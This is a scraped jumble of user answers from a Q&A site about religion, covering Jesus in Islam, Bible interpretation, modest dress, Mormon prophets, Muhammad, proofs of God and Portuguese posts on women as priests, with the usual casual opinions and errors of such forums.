Muslims always speak of Jesus with respect, and "Issa" (the Arabic rendition of his name) is a common given name in the Muslim world.    The Qur'an makes it very clear that Jesus was a prophet, chosen by God to teach his people, but not associated with nor part of God Himself.  He performed miracles, by the grace and power of God alone.  He of himself could do nothing -- all of his glory pointed back to the One Almighty God.    Muslims therefore reject the notion of the Trinity that is common in most Christian denominations today.  Islam adheres to a very strict monotheism, and considers such a theology to be idolatrous.    Additionally, Islam teaches that God is Merciful and forgives all sins, without the need for a Saviour or blood sacrifice of any kind.  Therefore, Muslims reject the idea that all of mankind is "saved" by any one creed or sacrifice.  In Islam, each person is judged mercifully by God, Who created us and knows our hearts and weaknesses.  While Muslims do not feel that their fate in the Hereafter is "guaranteed" (as many Christians would say), they do not despair -- for the Mercy of Allah is without measure.    In the end, Muslims believe that the message Jesus preached was one and the same as the message that all of the prophets brought to their people:  Worship Almighty God, and Him Alone.

You have come across one of the key arguments of the highly educated Jewish scholars who have spent hundreds of years trying to peacefully highlight some of the inconsistencies of the claimed "messiah" points of the New Testament, most notably blood lines.    Of course, how do you succeed in an argument with people who don't read much history on other beliefs, who believe a Bible heavily doctored in the 1600's by Oliver Cromwell is the true word of God? The answer is you can't.    So, interesting point, your question/statement but don't expect any blue-blooded Christian to even understand the significance or history of what you're saying.

Why do you Bible Bashers always do that?  You guys will take something totally out of context, or write only 1/2 of a verse.  Read the next sentence.

The City of David is also known as Bethlehem, (see Luke 2:1-51)  The Birth place of Jesus...Where the Bright Morning star led the way for the Wise men, shepherds etc. to see the Christ Child.

This doesn't point to the reasoning that Jesus wasn't the son of God.

In the late 1700's, for instance, the lifespan of a man in the US (well, the colonies soon to be the US) was in the mid-forties!  Because our medicine (and knowledge of the human body!) has improved so drastically, we are living very long lives today.      Think about it: they didn't have any sort of antibiotics until after the first world war.  If you got sick or had an infection you pretty much just died.  In the middle ages, in Europe, they didn't know anything about the body: they didn't know about pulses, and they had wakes because they couldn't really be sure when someone was dead.  They thought people had four humours that swished around in himan bodies, and that bodies were kind of hollow vessels.

3624c3f93031a4b0388f2bb2bf751883aa	No.  It isn't written anywhere in the bible that women should be completely covered.  Women should dress modestly.  People sin all the time. Some Christians are baby Christians and don't understand what dressing modestly is.  God never commanded me to be completely covered.  That would be a cultural thing.  Man's law.  God made me a woman, so I should dress in women's clothes.  For Sunday morning church, I feel I should dress my best & modestly.|`|AA11928225	No, nowhere in the Bible is clothing for the common person commanded.  Clothing is only commanded for priests.  Clothing is implied for others by Numbers 15:38 and this command of Tsitsis is understood to only be for men.    Of course, rabbinic tradition mandates modest clothing for everyone.  But you asked about Christians and they claim that they don't follow rabbinic tradition.  We know that Peter went naked when he was fishing (John 21:7), so presumably they were not all that concerned about being clothed.    The passage about women being dressed "modestly" is perhaps misunderstood.  The command is against them being dressed in fancy clothing, with fancy hairdos and the like.  It is about them not dressing pridefully, but to be humble.  And since one way to humble a person is to strip them naked I suppose you could try and make a case against them wearing clothing from there.    But in general you have to look at the fact that the Bible was written in the Middle East and if you weren't wearing clothing you get a terrible sunburn in the daytime and the desert gets pretty cold at night.  So the fact that people wore clothing for protection can probably be assumed.  Therefore a command wasn't needed.    Christians just need to realize that they got their standards of decent clothing from rabbinic tradition.|`|AA12341329	Women are told to cover there head and if not they should shave their hair as it is sinful to show their hair when praying 1 Cor:11-16  Also women should not speak in church, they are not permitted to speak, if they want to learn something they must ask their husbands.Corinthians1:14-35 Wives must submit to their husbands Ephesians:5:22-24|`|AA11237620	It should be asked like this,   Why do christians wear sexy clothes while they know this can affect the poor priests who have no right to marry, wouldn't that incite them to molest childrens.

President A. Theodore Tuttle  Of the First Council of the Seventy      "What is a living prophet? His age? He may be young or old. He need not wear a tunic nor carry a shepherds staff. His physical features are not important. A prophet need not have advanced educational degrees nor come from any special social class. He may be rich or poor. He needs no credentials from men.    What is it, then, that qualifies a man to be a prophet?    Foremost, God must choose him as his prophet! This is entirely different than for man to choose God. The Savior, speaking to his apostles, said, Ye have not chosen me, but I have chosen you, and ordained you, that ye should go and bring forth fruit.  (John 15:16.)    We believe that a man must be called of God, by prophecy, and by the laying on of hands, by those who are in authority to preach the Gospel and administer in the ordinances thereof. (A of F 1:5.)    A prophet, then, is the authorized representative of the Lord. While the world may not recognize him, the important requirement is that God speaks through him. A prophet is a teacher. He receives revelations from the Lord. These may be new truths or explanations of truths already received.    It is an easy thing to believe in the dead prophets. Many people do. For some mysterious reason there is an aura of credibility about them. It is not so with the prophet who lives among us, who must meet lifes everyday challenges. But it is a great thing to believe in the living prophets. Our salvation is contingent upon our belief in a living prophet and adherence to his word. He alone has the right to revelation for the whole Church. His words, above those of any other man, ought to be esteemed and considered by the Church as well as by the world. One day this truth will be understood.    Someone has said, That person is not truly converted until he sees the power of God resting upon the leaders of this church, and until it goes down into his heart like fire.    Some may wonder at such power and authority being vested in one man. Could he not lead us astray? they ask. President Wilford Woodruff once said, I say to Israel, the Lord will never permit me or any other man who stands as president of this Church to lead you astray. It is not in the program. It is not in the mind of God. If I were to attempt that the Lord would remove me out of my place, and so he will any other man who attempts to lead the children of men astray from the oracles of God and from their duty. (Discourses of Wilford Woodruff [Bookcraft, 1946], pp. 21213.)    President Henry D. Moyle has said, The older I get and the closer contact I have with the President of the Church, the more I realize that the greatest of all scripture which we have in the world today is current scripture. What the mouthpiece of God says to his children is scripture. It is his word and his will and his law made manifest through scripture, and I love it more than all other. (BYU tri-stake fireside, January 1963.)    The Lord has given this promise to his servants: And whatsoever they shall speak when moved upon by the Holy Ghost shall be scripture, shall be the will of the Lord, shall be the mind of the Lord, shall be the word of the Lord, shall be the voice of the Lord, and the power of God unto salvation. (D&C 68:4.)    President John Taylor said, We require a living treea living fountainliving intelligence, proceeding from the living priesthood in heaven, through the living priesthood on earth.  And from the time that Adam first received a communication from God, to the time that John, on the Isle of Patmos, received his communication, or Joseph Smith had the heavens opened to him, it always required new revelations, adapted to the peculiar circumstances in which the churches or individuals were placed. Adams revelation did not instruct Noah to build his ark; nor did Noahs revelation tell Lot to forsake Sodom; nor did either of these speak of the departure of the children of Israel from Egypt. These all had revelations for themselves, and so had Isaiah, Jeremiah, Ezekiel, Jesus, Peter, Paul, John, and Joseph. And so must we, or we shall make a shipwreck. (The Gospel Kingdom, [Deseret Book Co., 1944], p. 34.)    Orson Pratt has said, The very moment that we set aside the living oracles we set aside the revelations of God. Why? Because the revelations of God command us plainly that we shall harken to the living oracles. Hence, if we undertake to follow the written word, and at the same time do not give heed to the living oracles of God, the written word will condemn us.  (Journal of Discourses, vol. 7, p. 373.)    It is the right and responsibility of the prophets to counsel the Saints.    President Wilford Woodruff said, We, as a people, should not treat lightly this counsel, for I will tell you in the name of the Lordand I have watched it from the time I became a member of this Churchthere is no man who undertakes to run counter to the counsel of the legally authorized leader of this people that ever prospers.  you will find that all persons who take a stand against this counsel will never prosper.       We have been governed by counsel instead of commandment in many things, which has been a blessing to the saints.  (JD, vol. 14, pp. 33, 36.)    President Stephen L Richards comments on counsel:  a moments reflection will convince you of the rather serious regard in which we hold counsel. While it is true that we characterize infraction of the law as sin, and we do not apply quite that drastic a terminology to failure to follow counsel, yet in the Church, under the priesthood, counsel always is given for the primary purpose of having the law observed, so that it does occupy a place of standing and importance, almos|`|AA10598922	In the Mormon church - we have the same order now as was always in the Bible, with people who are called by God to their positions.

Christians says that God send his only son Jesus.. but Islam say that God send another prophet Muhammed... and so other's religion has other perspectives on God.. another religion also stated that God hasn't send the 'Saviour'... and so so many more.. you'll find it..    But there's a hope .. that we can share the same faith in God..  for every religion's God tells us the value of Love, Morality, Humanity.. to love others as you love yourself, to do good things..  so i guess "yes" !! in name of Love, Compassion, Kindness...|`|af6737ff39a6598f14d7ff849a296de8aa	yes, why not, as long as u believe in god any religion would do fine|`|a17fd30fb2b7a8774a31eefec19283aeaa	Yes.

There are many lesser gods such as Lusifer (the fallen Angle) and all of our idols we worship (money, power, The Braves), depth of faith in the creator is not limited  any one religion. No single religion has yet to be shared with every human on the planet so there is no way God can hold everyone to the same standard.    This means that the depth of your faith is based on the God of your understanding.    Many religions are closed societies or groups such as Judiasm. It is specifically a religion meant for the direct descendants of Abraham. Yes they do allow people to convert or join as prostalitized jews but Judiasm itself is a birth right religion.    The messianic extention of Judism, Christianity does much to promote the Good News that God Loves and Forgives. I know of no other religion that that is the core of their message. But even Christianity accepts the existence of other belief systems and infact states that if a person has never been exposed to the Good News that there is special dispensation by God for how they lived based on their best understanding.    I often wonder if as a Christian I am doing some people a dis-service by exposing them to the Gospel. If they were not exposed God wont hold them accountable. But Jesus was very clear when he said "Go and make disciples of all people" And since true freedome is found in love, grace, mercy and forgivness I am excited to share my secret to fredom and joy.
AA12325338	In actual sense there is no exact record that Joseph DIED!  That has to be cleared first... No actual fact that says that he died or even was around when Jesus was older...  OK lets do the math. Tradition of the church says that Jesus was born to a young maiden. So this would refer to a girl who is very young in fact.. which explains why many artists draw Mary as a young GIRL... i suppose in her early 15 at lest... and she was engaged with a man(again traditionally a widower) maybe around 30 or 40 or 50...no one knows! But Joseph was also silent in the gospels!  Joseph could have died of natural causes... (old age)  or something else... but this is for sure... he died because in the gospel of John, Jesus gives his mother to John to take care of.. would she go if she is already staying with a husband?!?!  makes no sense..  Joseph probably died just before Jesus begun his public ministry. This silent carpenter died not that silent because by living and following the instruction of God, he saved both the lives of Jesus and Mary from King Herod... He followed a dream... He lived a godly life..|`|AA11682249	All we know is that it was before Jesus began His public ministry.|`|AA12366625	He is nt dead he is in heaven when God will sent him to the earth then he will come and kill the bad guys.|`|eccf881472c075b2298c2cc4cbe1c630aa	Joseph was 99 be for marry had Jesus and he was 30 be foe he started hes works.

cd980f5100c5a38171dd3258ce0d9896aa	oh the one thing that you can be sure of is the Bible!    if ur a believer of Christ, you are called a Christian.. But the concept of Religion enters when a person decides for his/her religious practices...    Christ did not established religion. he didnt indicate if His church is catholic/baptist etc.    and i can say that Roman Catholic Church is not the true Church...  it is because its doctrines are corrupted...  christianity is for real but not until Constantine made Christianity as a state religion for the byzantine empire...    as you know, romans have different gods. They are pagan! when Christianity came, people dont know the nature of Christianity, its doctrines etc. They just know that Christ was the Messiah.... so that means people did not leave their sinful nature (idolatry, worshipping gods). So that is why we have Catholic Church, full of idol worship..     The Bible, the only thing that has not been changed even before Creation, will set you free... Coz the truth will set you free. God bless you!|`|AA12118274	All of the basic fundimental tenents of Christianity are intact and for the most part agreed on.     We disagree and argue about alot of the little less important things.

How can the bible serve as any kind of a moral guide when no two Christians agree on anything that is written in it and when there are literally thousands of different Christian denominations who all disagree with each other and who each believe they have the truth...in fact none of them do,   Religion is not the answer...religion is the problem! it is a great divisive force in society.|`|AA12066928	Jefferson once wrote that, Paul was the first corrupter of the teachings of Jesus.  www.barnabas.net|`|AA11771054	no it is not true and if you wanna be sure watch the debater ahmed dedaat|`|AA11346910	Even though one might view the disagreements among believers and rush to a hasty conclusion that therefore the christian faith is a fake, or perhaps not the original, it is nevertheless not an argument to prove anything, other than to prove the premises (that the christian faith is wrong) one first started out with.    Perhaps, it is more helpful to note that every believers (no matter which background they were from) will readily testify in unity that the basic and most important element in their faith, is the historical fact that Jesus Christ died for our sins and rose again on the third day so that we may live by faith in Him. This most important fact of the christian faith has not once been altered but, on the contrary, passed down intact from generations to generations instead.     In fact, Paul the apostle, wrote that if Christ did not rise on the third day, our (the believers) faith would have been in vain. Till today, I think it's encouraging to see that most, if not all, christian circles welcome critics to examine the historical fact that Jesus died and rose. If anyone can prove that Christ has not resurrected, he certainly has torn down "the world's greatest lie".     Moreover, we do have God's word (the Bible) with us, and it have been cautiously handled down to us by means of meticulous copying process, in the reverend fear of subtracting or adding to God's word. And it is not an understatement that the New Testatment writtings has more maunscript support than the rest of the secular literature around its time.     The vast amount of the manuscripts (of different sources) also points to the intergrity of God's word as a whole. No one, even if he wishes, is able to alter God's word on a massive scale because one simply cannot gather all the manuscripts (from different locations) and change the original intended meaning. If one did alter the text, it will be obvious when the text is compared to one of another source.     And we must also add that despite having all the different manuscripts from various sources (which also means that there should be variants in reading), one could go as far as saying that 98% of all manuscripts speak of the same thing, while the remaining couple of percentage differences pertain to merely grammatical and sentence structural issues that doesn't affect any major theology.     We can hence safely conclude that the Bible is reliable and that the christian faith is not something someone made up from the air.|`|AA11981714	Just do it...

I wonder if God is pouting or the cat got his tongue.  Next time around, when he talks with a prophet, I hope he is a lot more clear in what is said.  That vague poetic metaphor style drives me nuts.|`|AA12380217	Throughout time God has chosen various prophets to lead and guide His children.  Prophets were chosen to represent the voice of God.  Unfortunately the prophets were never popular in the eyes of the people.  Noah tried to save as many as he could from the great flood, but so very few actually listened.  Moses was not only hated by the Egyptians, but even by his own people the Israelites despite the many miracles they had seen.  Jesus was hated and killed because of what He taught.  Many other prophets are named in the Bible, too, but most of the time their teachings were not practiced by the majority of the people.  Did God eventually give up and stop calling prophets?  Why would he speak to prophets in ancient times, but not today?  I don't think it's because our society is so righteous that we have no need for prophets.  I feel we have even greater need for prophets today, to help us steer clear of the many sins in the modern world.    The Church of Jesus Christ of Latter-day Saints teaches that we do have prophets today.  The Church of Jesus Christ, which had become corrupted and eventually lost over time after the death of Jesus and His Apostles, was restored through the prophet Joseph Smith in 1830.  Since the time of Joseph Smith, God has continued to call prophets to lead His church.  Today that prophet is Gordon B. Hinckley.  God continues to reveal His word to man.    As far as the earth having four corners (as referred to in Isaiah 11:12), I don't think Isaiah was implying that the Earth is square and has four distinct corners.  He also describes the Earth as a circle (Isaiah 40:22), which doesn't have any corners.  The four corners of the earth is generally understood to be a metaphor representing the farthest reaches, or all parts of the earth.|`|AA11044759	yes we have them they r the ones we think are nuts, open ur eyes we have them|`|AA10484153	God says that he confounds the wise with the foolish, so there goes your rational thinking - and God says he has always been, is and always will be, so why would he change?

The Saga continues in the Fifth Epochal Revelation...    http://www.urantia.org/papers/index.html|`|d6f3f16a24596ee000a34bde13aec73caa	A prophet is often hated in his (or her) own time, so while we may have prophets. their existence or truth may be unknown to us.      As for those that will argue against your point with rationalizations from the Bible, it is inevitably a book made by humans, no matter how divinely inspired.  It has undergone permutations throughout the centuries, and even when the words are untouched, interpretations change, for this is not the world of the past and it never will be.    As for God teaching us, I do not think that has ever stopped.  The collection of books and texts known as the Bible should be regarded as a mix album of the Christian thought of the early period of the Church, with each denomination   choosing a slightly different version of the same song.  Some listen to the orchestral version, others the live version, and many, the major studio release.  But others make their own mix entirely, sampling the beats for a rap song, or improvising a melody based on the themes of the original.     As for who is a prophet, I cannot identify them by name for you.  However I know they are out there.  they are the poets that open your mind, they are the singers that transport your soul to a different place, if only for a moment.  They are the ones that rattle the cages of society and say, "Look at the folly of your hatred, your lack of compassion.  You will kill yourself as surely as you are killing your brothers, who you call demons!"  Prophets confront us with present reality and our complacency as much as they tell of the future and what will happen.  They are creative and sensitive souls with a message, if we would just listen.    As for esoteric prophecy, or religious prophets,  look beyond the religions of the masses and you will find that there are a few people who have visions today.  Native American prophecies are supposedly coming true even as we speak, and from what I know of their people, the medicine men of the tribes are going on vision quests and being granted pictures of the times to come.  Some even say doomsday is soon upon us.    As for me, I think that if we do not begin to see the world as brothers and sisters, we will all be facing great hardship.  But if we do unite, we will still face great hardship and the end of an age, but the pain will be shared and the work will be divided.  We can all help each other throughout the transition to the world to its next age, if we just occasionally shut up. listen and think-rather than trying to prove ourselves superior at all times.|`|AA11081090	I believe there are modern day prophets but it is very hard for them to be heard.

Another is my pastor Mark Estep (Spring Baptist Church). Prophets are those who declare the Word of God. Even when the world chooses not to listen. The Bible is not outdated. Everything applies to modern times. It is we, who view it as outdated.

Muhammed A  Z  May Allah Exalt his Mention  By Yusuf Estes, Former Christian Preacher    Muhammad ibn Abdullah ibn Abdul Muttalib  Born 570 C.E. (Christian Era); died 633 C.E.    The following is based on books, manuscripts, texts and actual eyewitness accounts, too numerous to mention herein, preserved in original form throughout the centuries by both Muslims and non-Muslims.    Many people today are discussing Prophet Muhammad, may Allah exalt his mention. Who was he exactly? What did he teach? Why was he loved so much by some and hated so much by others? Did he live up to his claims? Was he a holy man? Was he a prophet of God? What is the truth about this man?You be the judge.  Here are the facts as narrated by thousands of people, many of whom knew him personally.  *He was born to a noble tribe to the lineage of the leaders of Makkah.  *His name comes from the Arabic root "hamd" and literally means "praised one." People at his time and until this very moment, praise him many times per day, may Allah exalt his mention.  *He never fell into the common practice of his tribesmen to worship statues, idols or man-made "gods."  *He believed that God was truly One God, and as such, He was to be worshipped alone, without any other "gods" beside Him.  *He held the Name of God in the highest of reverence and never took God's Name in vain or for any vain glorious purpose.  *He despised false worship and all of the complexities and degradation to which it leads.  *He adhered to the Commandments of Almighty God, just as prophets of old had done in the past.  *He never committed adultery, and he forbade others from doing it.  *He forbade usury and interest on money lending, as Jesus, may Allah exalt his mention, had done centuries before him.  *He never gambled and did not allow it.  *He never drank alcohol or strong drink; even though it was a very normal thing for people of his time and place.  *He did not engage in gossip and used to turn away from hearing anything related to it.  *He fasted for days at a time to be closer to Almighty God and away from the narrowness of worldly attractions.  *He taught that Jesus, may Allah exalt his mention, was the immaculate conception and miracle birth of Mary, and that she was among the best creation of Almighty God.  *He insisted even to the Jews of Medina, that Jesus, may Allah exalt his mention, was the Messiah, the Christ, the one predicted to come in their Torah (Old Testament).  *He said Jesus, may Allah exalt his mention, did many miracles by the permission of Almighty God, curing the lepers, restoring sight to the blind and even bringing a dead man back to life.  *He stated clearly that Jesus, may Allah exalt his mention, was not dead, rather Almighty God had raised him up.  *He foretold that Jesus, may Allah exalt his mention, is going to return again in the Last Days to lead the true believers in a victory over the evil and unrighteous people, and he will destroy the Anti-Christ.  *He commanded the payment of charity to the poor and he was the defender and protector of widows, orphans and the wayfarers.  *He ordered people to unite with their families and honor the ties of kinship and he restored relationships between family members.  *He required his followers to engage only in lawful marriage relationships with women, and forbade sex outside of Almighty God's Ordinance.  *He insisted on giving women their proper rights, dowries, inheritance and property.  *His patience and humble attitude were exemplary and all who knew him had to admit to these virtues.  A. He never lied, never broke a trust never bore false witness, and he was famous with all the tribes in Makkah and was known as: "The Truthful" (Al-Ameen).  B. He never once engaged in sex outside of marriage, nor did he ever approve of it, even though it was very common at the time.  C. His only relationships with women were in legitimate, contractual marriages with proper witnesses according to law.  D. His relationship to Ayesha was only that of marriage. Their relationship is described in every detail by Ayesha herself in the most loving and respectful manner as a match truly made in heaven. Ayesha is considered as one of the highest scholars of Islam and lived out her entire life only having been married to Muhammad, may Allah exalt his mention. She never desired any other man, nor did she ever utter a single negative statement against Muhammad, may Allah exalt his mention.  E. He forbade any killing until the orders came from Allah. Even then the limits were clearly spelled out and only those engaged in active combat against the Muslims or Islam were to be fought in combat. And even then, only according to very strict rules from Allah.  F. Killing any innocent life was forbidden.  G. There was no genocide of Jews. He offered mutual protection and forgiveness to the Jews even after they broke their covenants with him many times. They were not attacked until it was clearly proven they were traitors during time of war and tried to bring down the prophet, may Allah exalt his mention, and the Muslims at any cost. Retaliation was only to those Jews who had turned traitor and not others.  H. Slaves were common in those days for all nations and tribes. It was Islam that encouraged freeing of the slaves and the great reward from Allah for those who did so. Prophet, may Allah exalt his mention, gave the example of this by freeing slaves and encouraging all of his followers to do the same. Examples include his own servant (who was actually considered like a son to him) Zaid ibn Al Haritha and Bilal the slave who was bought by Abu Bakr only for the purpose of freeing

On another note, if we are wrong, and there is no God, then we will have lived a life believing in vain, but trying to make the world a better place, while atheists will smugly find that they are worm food and lived their lives in vain trying to go around disproving and proving worthless theories in the scheme of things.

But unless you are just stupid, God exists in some way for all of us.

The proportionate thrust in a single jet engine scaled down to size is equal to the power the butterfly has to take off.  If man created the weather -- then how come so many weather man are wrong most of the time.  Faith is also called blind faith -- that is why it's faith.  We trust, without seeing, we believe without understanding -- doesn't mean it's wrong to question -- We continue to question, we continue to trust -- something must have kept this planet alive all these years -- and believe even if you believe in aliens (space) how did they come about -- or why are species becoming extinct -- because they are or because we caused their demise.  For every conclusion, there exists well, what came before that -- just look around MAYBE to you "God" doesn't exist by that name -- but someone/something/somehow keeps us going.|`|AA12343985	I like this analogy...thanks for sharing.|`|AA10724476	YES!

Let's go check it out so I can be sure it's real!"    Then after getting there:  "Wow!  That's so cool!  So there IS a place people call California!  Well, this is just too much!  Thank you for bringing me here to prove your point!  Next thing you'll probably say, Helen, is that there really is this place that's supposed to be even nicer called Hawaii.

The person knows that each step is a certain distance on the land. Take him step by step to the boundary line of another state and tell him that when he's crossed over the boundary line. Since state lines are divisions of land, all you need is a supporting cast to affirm the boundary line.    For places across the sea, take him to the ocean, set up a post and have him tie up a string. Take him along the coast, setting up poles and tiying the string along the poles until he has gone along the entire continent. This will prove to him that he is on an island.    Strap him to a guerny at the start point, and carry him in one direction, taking time to allow him to test whenever he wishes to make sure he's facing the same direction as before and that they're still on water. When he reaches land, then he has been proven that there is another land other than the US. Logically, this land will have a different name, unknown to the person.|`|AA11798742	Ugh?  What's the question again?  Does this mean there is no God because we can't see him?  I can't see gravity either but I know it is there.  Look at the beautiful things in the earth, the complex eye, the hearing ear.  These didn't just happen.  You don't need to see a creator to know he is there.  If that is the question?|`|AA10392624	Okay!  You are the one who believes your parents!  I'd like to show you how we came to be and how much we could do with life, but you're not having any of it.

What if they had said they came from the state "zahickywoky"  the man still wouldn't believe him, and for good reason.  And most atheists aren't so because their parents told them there was no God, they figured it out for themselves, so this story is more like christianity than anything else.|`|AA12058912	lol are you saying that too many people believe they follow the one true god because there Mommy's told them so.

AA10588248	Good day, Mizz Pattie! Please bear with me as you read my answer. Ill try to clear your doubt with as much of Gods Word as possible.     The Apostle Paul, whom under the inspiration of the Holy Spirit, wrote most of the New Testament books and as we read them, we discover how much he had gone through to preach the Word of God and save new souls. Just who is the apostle Paul? Paul, who was Saul before his conversion, was a Pharisee infamous for putting people behind bars, especially those who worshipped Jesus Christ of Nazareth. He was known for his harsh persecution, but despite that, God chose him to do his will. It is a rather long story, so you had better read and find out from the book of Acts in the New Testament. One thing that you must note, however, is that the apostle Paul reached out to the Gentiles.     In Galatians 3: 26-28, while under the influence of the Holy Spirit, Paul wrote, You are all sone of God through faith in Christ Jesus, for all of you who were baptized into Christ have clothed yourself with Christ. There is neither Jew nor Greek, slave nor free, male nor female, for you are all one in Christ Jesus.    I believe that this scriptural verse is the answer to racial discrimination. We who have faith in Jesus are all sons and daughters of God. Choo Thomas, the author of Heaven Is So Real, is a Korean-American, but Jesus chose her to spread a prophetic message through her book to the people of our current century. Many preachers who are not of Jewish blood also received power and authority from Jesus himself to preach the gospels and save souls, rebuking the devil and casting out demons. Jesus never intended to be biased towards the Jewish. He even healed the Gentiles when they cried out to him.     Lets take a look at the story about the faith of the Canaanite woman in Matthew 15: 21-28:    Leaving that place, Jesus withdrew to the region of Tyre and Sidon. A Canaanite woman from that vicinity came to him, crying out, Lord, Son of David, have mercy on me! My daughter is suffering terribly from demon-possession.   Jesus did not answer a word. So his disciples came to him and urged him, Send her away, for she keeps frying out after us.  He answered, I was sent only to the lost sheep of Israel.  The woman came and knelt before him. Lord, help me! she said.  He replied, It is not right to take the childrens bread and toss it to their dogs.  Yes, Lord, she said, but even the dogs eat the crumbs that fall from their masters table.  Then Jesus answered, Woman, you have great faith! Your request is granted. And her daughter was healed from that very hour.    I do hope that this answers your question, Mizz Pattie.|`|AA11518036	Everyone is God's children, no mater what religion you are|`|AA12270622	Well, I'm not a Christian, freely admitted, but I may have an answer for you.    The problem with defining "Jews" and "Gentiles" in this case is that it's largely done out of context.    Are the Jewish people God's chosen people?  Yes.  I don't think there's any denying that since the Old Testament of the Bible is the Torah of the Jewish faith, and God very clearly defines in the Torah that the Jews are His chosen and faithful people... but then, the fact you share that religious text as the foundation of both your faiths should tell you that you are not standing "outside the fold".    The thing about it is, are Christians really gentiles?  From a Jewish point of view, they would be, because they aren't Jewish.  However, if you're a Christian, you are subscribing to what you believe to ultimately be the evolution of the Jewish religion through the arrival of God's Messiah, yes?    Jesus himself came to teach the Jews the way to God.  If you read his comments on the "gentiles", it's clear he is talking about non-believers.  Jesus sets a definition of being one of God's chosen people not through birth, but by choosing to seek God through the Word.    The religion which evolved out of the teachings of Jesus and the Jewish religion is, if you are a Christian, what your beliefs tell you the Jewish faith was naturally supposed to become.  As crude as this may sound, Christianity is basically "Jews for Jesus", which means as much as Jews may like to insult Christians with the term, Christians aren't, biblically speaking, gentiles.      Christianity isn't an abandonment of God or His laws, it's believing you follow God more completely by following both His teachings and commandments to the Jewish people, and also the teachings of the Messiah He sent to show you the way.    On this one, I really don't think you should sweat it.  God wouldn't send His only Son to illuminate the way for you so He could turn around and like you less for listening like you were supposed to.    God's Creation is, in its entirety, His most prized possession.  He has the capacity to love and care for all of it equally and without measure, and as far as I can tell, would like for everyone to find comfort and peace in the light of His love.    You aren't any less deserving of that or any less favored in that regard than anyone else is.    =)|`|4b6e948d9a7a4fb128b24c55bd4c9207aa	god doesnt exist|`|c1958063009bb2743a42d4b0d05adceaaa	Well then go be a Jew, were all the same!

It is a lack of knowledge by which God's people perish.   The promise to Abraham is that the world would be blessed through his seed ,Jesus and now if you have Jesus in your heart and are his follower then you are a Jew spiritually.this should help you.

fce7f2e58e8b7354171bb6a3e2452fcdaa	A sociedade judaica, da qual se originou a Bblia Sagrada, era e  uma sociedade patriarcal. A figura masculina, domina, governa,comanda, lidera. A religi?o conhecida como Cristianismo advm dessa sociedade e nossas Igrejas, quer catlicas ou evanglicas pautam-se nos conceitos doutrinrios registrados na Bblia Sagrada (Os evanglicos 100%, os catlicos n?o). A Igreja catlica Romana e a Ortodoxa Grega utilizam a Bblia apenas, parcialmente, enquanto os evanglicos a utilizam 100%. Para os evanglicos somente a Bblia  o padr?o de conduta de f e prtica. A Bblia n?o respalda a ordena??o de mulheres como lderes espirituais. A palavra padre como ttulo dado aos sacerdotes catlicos n?o  Bblica. A Bblia indica: Pastores, Apostlos, Mestres, Evangelistas, Bispos, Presbteros, Diconos. Isso faz parte da invencionice que adentrou na Igreja Crist? aps a tomada do poder do Imprio Romano por CONSTANTINO, no ano de 312 da Era Crist?. Por causa disso, dessas invencionices n?o bblicas  que no ano de 1517, eclodiu, isto , chegou ao seu climax o racha que ficou conhecido como a REFORMA PROTESTANTE.  Muito boa sua pergunta.

Acho que e algo que tem sido questionado.|`|95387712e776ef1f399e1b117f2d4671aa	bem, a quest?o hoje  entendida a partir de um fundo religioso, mas no passado teve haver com questoes culturais.  no passado a mulher era considerada algo a mais e nao essencial na vida do ser humano, essa concep??o vem desde a grcia antiga onde a concep??o de cidad?o nao abarcava mulheres, escravos e crian?as, a partir desta concep??o at os dias atuais foi s quest?o de aperfei?oamento.  importante perceber que no caso da grcia antiga nao havia machismo ou coisa do tipo, o fato era cultural. j depois de cristo institui-se a religi?o como conhecemos agora, algo que tem o objetivo de religar um elo que foi quebrado, este elo seria a liga??o do homem com deus que foi quebrado com a apostasia em que os homens estaja no momento da crucifica??o de cristo.  a partir das concep??es gregas, a igreja catolica e toda a sociedade de entao, que tinha como principio do conhecimento aristoteles, platao e os filosofos regos, que estavam inseridos em sua cultura, logico, a tradi??o de o homem ser o centro continuou.  a mulher era submissa pelo fato de ser uma especie de "quase homem" ou "homem incompleto" o que esplica o fato de ela nao ser considerada como algo que se relaciona em sociedade.  o fator religioso  que deus a aprtir de seu livro, a biblia sagrada, so se comunicava com a humanidade a partir dos homens e nao das mulheres, o que pode ser cnsiderado como mais um fator cultural, dessa forma a mulher nao poderia ser apostolo, homens que se comunicam direto com o sagrado e portadores da verdade. at mesmo os apostolos eram todos homens.  o homem representa for?a, ragem e sapiencia. biblicamente falando a mulher deve obedecer ao homem e este deve governar sua casa e sua mulher.  isto esplica o fato de que somente homens podem exercer o sacerdocio.|`|99292842cb04b08227e340d4160121acaa	J pensou uma mulher com TPM proferindo uma homilia?|`|1770b509cb90686855dbdc5ea2e85f1baa	isso so acontece na igreja catolica, porque na igreja evangelica, como vc deve saber, no lugar de padre  pastor e existe pastora tambem, que realiza as mesmas coisas que o pastor.|`|e95ee5f09b5f6123cbd61ecb090718ffaa	Por que, a igreja foi criada na hera medieval, com o intuito de controlar os pobres ignorantes, manipulando informa??es para o beneficio deles prprios "os padres".

Veja esses textos na Bblia Sagrada 1 Tm 3.1-13 e Tt 1.5-9.  Entretanto, devemos levar em considera??o o trabalho feminino que pode ser desenvolvido na Igreja. E assim como Cristo e os demais apstolos, respeitar e amar as mulheres.
